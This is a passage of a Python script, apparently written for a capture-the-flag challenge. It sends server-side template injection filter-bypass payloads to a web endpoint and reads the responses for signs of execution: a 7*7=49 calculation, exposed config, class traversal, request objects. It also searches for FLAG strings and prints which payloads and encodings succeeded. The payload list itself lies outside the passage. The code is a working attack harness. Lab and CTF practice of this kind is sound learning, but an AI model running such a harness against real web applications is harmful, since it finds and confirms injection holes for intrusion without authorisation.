        # Send request with payload as parameter
        params = {'data': test_case['payload']}
        
        response = requests.get(
            f"{base_url}{endpoint}",
            params=params,
            cookies=cookies,
            timeout=10,
            allow_redirects=False
        )
        
        # Analyze response
        status = response.status_code
        response_length = len(response.text)
        
        print(f"[Status] {status}")
        print(f"[Length] {response_length} bytes")
        
        # Look for signs of SSTI execution
        response_text = response.text
        has_49 = '49' in response_text  # 7*7 = 49
        has_config = 'config' in response_text
        has_class = '__class__' in response_text
        has_request = 'Request' in response_text or 'request' in response_text
        
        execution_signs = []
        if has_49:
            execution_signs.append("CALC_EXECUTED")
        if has_config:
            execution_signs.append("CONFIG_VISIBLE")
        if has_class:
            execution_signs.append("CLASS_TRAVERSAL")
        if has_request:
            execution_signs.append("REQUEST_OBJECT")
        
        # Check for flag
        flag_match = None
        import re
        flag_pattern = r'FLAG\{[^}]+\}'
        flag_search = re.search(flag_pattern, response_text)
        if flag_search:
            flag_match = flag_search.group(0)
            print(f"[!] FLAG FOUND: {flag_match}")
            successful_payloads.append(test_case)
        
        # Print first 500 chars of response if interesting
        if execution_signs or response_length < 2000:
            preview = response_text[:500]
            print(f"[Response Preview] {preview}")
        
        if execution_signs:
            print(f"[!] EXECUTION SIGNS: {', '.join(execution_signs)}")
            successful_payloads.append(test_case)
        
        results.append({
            'test_case': test_case,
            'status': status,
            'length': response_length,
            'has_flag': flag_match is not None,
            'flag': flag_match,
            'execution_signs': execution_signs,
            'response_preview': response_text[:300] if execution_signs or flag_match else None
        })
        
    except Exception as e:
        print(f"[ERROR] Test failed: {e}")
        continue

# Summary
print(f"\n{'='*60}")
print(f"[*] SSTI FILTER BYPASS TEST COMPLETE")
print(f"[*] Total tests: {len(test_cases)}")
print(f"[*] Successful executions: {len(successful_payloads)}")

if successful_payloads:
    print(f"[*]="*60)
    print(f"[!] SUCCESSFUL PAYLOADS:")
    for sp in successful_payloads:
        print(f"[+] Category: {sp['category']}")
        print(f"[+] Encoding: {sp['encoding']}")
        print(f"[+] Payload: {sp['display_payload']}")
        print()

# Check for any flags found
all_flags = [r['flag'] for r in results if r['flag']]
if all_flags:
    print(f"[!] FLAGS DISCOVERED: {all_flags}")
else:
    print(f"[*] No flags found in this test run")
    print(f"[*] Analysis of filter behavior:")
    
    # Analyze which encodings worked
    categories = {}
    for r in results:
        cat = r['test_case']['category']
        if r['execution_signs'] or r['has_flag']:
            categories[cat] = categories.get(cat, 0) + 1
    
    print(f"[*] Successful categories: {categories}")

